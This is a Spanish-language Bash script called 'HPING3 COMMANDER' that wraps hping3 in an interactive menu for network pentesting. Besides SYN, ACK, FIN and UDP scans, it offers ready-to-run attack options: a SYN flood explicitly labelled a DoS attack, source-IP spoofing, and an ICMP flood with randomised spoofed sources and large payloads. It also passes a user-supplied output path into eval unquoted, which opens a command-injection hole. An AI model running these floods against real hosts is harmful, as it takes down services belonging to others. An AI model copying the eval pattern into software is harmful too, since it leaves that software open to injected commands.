#!/bin/bash

# Colores
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
RESET='\033[0m'

# Verificar si es root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] Este script debe ejecutarse como root.${RESET}"
    exit 1
fi

# Verificar si hping3 está instalado
if ! command -v hping3 &> /dev/null; then
    echo -e "${RED}[!] hping3 no está instalado. Instálalo con: sudo apt install hping3${RESET}"
    exit 1
fi

# Función para guardar o no
guardar_resultado() {
    read -p "¿Deseas guardar la salida? (s/n): " save
    if [[ "$save" == "s" ]]; then
        read -p ">> Ruta del archivo (ej: /home/usuario/hping-output.txt): " file
        OUTPUT=" > $file"
    else
        OUTPUT=""
    fi
}

# Título
clear
echo -e "${GREEN}"
echo "╔════════════════════════════════════════════╗"
echo "║              HPING3 COMMANDER             ║"
echo "║        Pentesting interactivo en red      ║"
echo "╚════════════════════════════════════════════╝"
echo -e "${RESET}"

# Menú principal
while true; do
    echo -e "${GREEN}
╔════════════════════════════════════════════╗
║                  MENÚ HPING3              ║
╠════════════════════════════════════════════╣
║ 1. Escaneo SYN (modo stealth)              ║
║ 2. Escaneo ACK (detección firewall)        ║
║ 3. Escaneo FIN (evasión de firewall)       ║
║ 4. Escaneo UDP                             ║
║ 5. Ataque DoS (flood SYN)                  ║
║ 6. Spoofing IP                             ║
║ 7. Salir                                   ║
║ 8. Flood ICMP con fuente aleatoria         ║
╚════════════════════════════════════════════╝
${RESET}"

    read -p ">> Elige una opción [1-8]: " opt

    case $opt in
        1|2|3|4|5|6)
            read -p ">> IP objetivo: " ip
            read -p ">> Puerto objetivo (o rango): " port
            ;;
        8)
            read -p ">> IP objetivo para flood ICMP: " ip_icmp
            ;;
    esac

    case $opt in
        1)
            guardar_resultado
            echo -e "${YELLOW}[*] Ejecutando escaneo SYN...${RESET}"
            eval hping3 -S -p "$port" "$ip" $OUTPUT
            ;;
        2)
            guardar_resultado
            echo -e "${YELLOW}[*] Ejecutando escaneo ACK...${RESET}"
            eval hping3 -A -p "$port" "$ip" $OUTPUT
            ;;
        3)
            guardar_resultado
            echo -e "${YELLOW}[*] Ejecutando escaneo FIN...${RESET}"
            eval hping3 -F -p "$port" "$ip" $OUTPUT
            ;;
        4)
            guardar_resultado
            echo -e "${YELLOW}[*] Ejecutando escaneo UDP...${RESET}"
            eval hping3 --udp -p "$port" "$ip" $OUTPUT
            ;;
        5)
            echo -e "${YELLOW}[*] Ejecutando flood SYN (Ctrl+C para detener)...${RESET}"
            hping3 -S --flood -p "$port" "$ip"
            ;;
        6)
            read -p ">> IP falsa (spoof): " fakeip
            guardar_resultado
            echo -e "${YELLOW}[*] Ejecutando spoofing IP...${RESET}"
            eval hping3 -a "$fakeip" -S -p "$port" "$ip" $OUTPUT
            ;;
        7)
            echo -e "${GREEN}[+] Saliendo de HPING3 COMMANDER...${RESET}"
            exit 0
            ;;
        8)
            echo -e "${YELLOW}[*] Ejecutando flood ICMP con fuente aleatoria... (Ctrl+C para detener)${RESET}"
            hping3 --icmp --rand-source --flood -d 1200 "$ip_icmp"
            ;;
        *)
            echo -e "${RED}[!] Opción inválida.${RESET}"
            ;;
    esac

    echo -e "${GREEN}\nPresiona Enter para continuar...${RESET}"
    read
    clear
done
